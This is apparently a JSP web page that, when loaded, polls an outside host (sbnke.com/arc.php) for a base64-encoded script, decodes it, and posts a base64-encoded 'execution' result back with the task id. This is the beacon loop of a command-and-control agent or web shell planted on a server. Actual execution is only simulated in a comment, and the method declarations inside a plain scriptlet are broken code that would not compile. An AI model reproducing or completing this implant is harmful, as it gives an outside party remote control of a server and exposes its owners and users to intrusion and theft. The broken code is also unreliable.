<%@ page import="java.net.*, java.io.*, java.util.Base64, org.json.JSONObject" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>

<%
    // Function to make GET request
    String getApiResponse(String urlString) throws IOException {
        URL url = new URL(urlString);
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestMethod("GET");
        connection.setConnectTimeout(5000);
        connection.setReadTimeout(5000);

        int status = connection.getResponseCode();
        if (status != 200) {
            throw new IOException("Request failed with status: " + status);
        }

        BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
        String inputLine;
        StringBuffer content = new StringBuffer();
        while ((inputLine = in.readLine()) != null) {
            content.append(inputLine);
        }

        in.close();
        connection.disconnect();
        return content.toString();
    }

    // Function to send POST request
    void sendPostRequest(String urlString, String jsonData) throws IOException {
        URL url = new URL(urlString);
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestMethod("POST");
        connection.setRequestProperty("Content-Type", "application/json; utf-8");
        connection.setDoOutput(true);

        try (OutputStream os = connection.getOutputStream()) {
            byte[] input = jsonData.getBytes("utf-8");
            os.write(input, 0, input.length);
        }

        int status = connection.getResponseCode();
        if (status != 200) {
            throw new IOException("POST request failed with status: " + status);
        }

        connection.disconnect();
    }

    // Main logic
    try {
        // Step 1: Make a GET request to retrieve data
        String apiUrl = "https://sbnke.com/arc.php";
        String getResponse = getApiResponse(apiUrl);
        
        // Parse the JSON response
        JSONObject data = new JSONObject(getResponse);
        String uniqueId = data.optString("id");
        String base64Code = data.optString("code");
        String status = data.optString("status");

        if (uniqueId.isEmpty() || base64Code.isEmpty() || !status.equals("0")) {
            out.println("No valid data found in the API response.");
        } else {
            // Step 2: Decode the base64-encoded script (simulated here)
            String decodedCode = new String(Base64.getDecoder().decode(base64Code), "UTF-8");

            // Simulate executing the script (since we can't actually execute Python code in JSP)
            // We'll simulate output capture with a simple message
            String simulatedOutput = "Executed script: " + decodedCode;

            // Step 3: Encode the output and send it back via a POST request
            String encodedOutput = Base64.getEncoder().encodeToString(simulatedOutput.getBytes("UTF-8"));

            JSONObject postData = new JSONObject();
            postData.put("id", uniqueId);
            postData.put("result", encodedOutput);
            postData.put("status", "1");

            sendPostRequest(apiUrl, postData.toString());

            out.println("Execution complete. Result sent to the API for id = " + uniqueId);
        }
    } catch (Exception e) {
        out.println("Error: " + e.getMessage());
    }
%>